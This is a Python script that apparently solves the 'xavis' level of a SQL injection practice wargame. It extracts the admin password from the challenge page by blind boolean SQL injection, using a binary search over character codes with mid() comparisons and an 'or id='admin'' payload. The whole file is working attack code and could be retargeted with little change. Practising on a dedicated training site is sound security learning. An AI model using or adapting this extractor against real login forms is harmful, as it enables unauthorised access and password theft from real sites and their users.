import urllib.parse

from constants import *

chall_url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php"

pw_len = None
prefix = ""


def find_char(pos):
    min_val = 0
    max_val = 0xFFFF

    while True:
        test_val = max_val - (max_val - min_val) // 2
        # print(hex(min_val)[2:].zfill(4), hex(test_val)[2:].zfill(4), hex(max_val)[2:].zfill(4))
        res = make_request(chall_url, "?pw=" + urllib.parse.quote(
            f"' or id='admin' and mid(pw,{pos},1) >= 0x{hex(min_val)[2:].zfill(4)} and mid(pw,{pos},1) < 0x{hex(test_val)[2:].zfill(4)} -- -"))

        if hello_admin in res:
            if test_val - min_val == 1:
                print("found char", hex(min_val), chr(min_val))
                return chr(min_val)
            max_val = test_val
        else:
            min_val = test_val


prefix = "우왕굳"

while True:
    res = make_request(chall_url, f"?pw={prefix}")
    if check_clear(res, noPrint=True):
        break
    else:
        pos = len(prefix) + 1
        new_char = find_char(pos)
        prefix += new_char
        print("new prefix: ", prefix)

res = make_request(chall_url, f"?pw={prefix}")
check_clear(res)
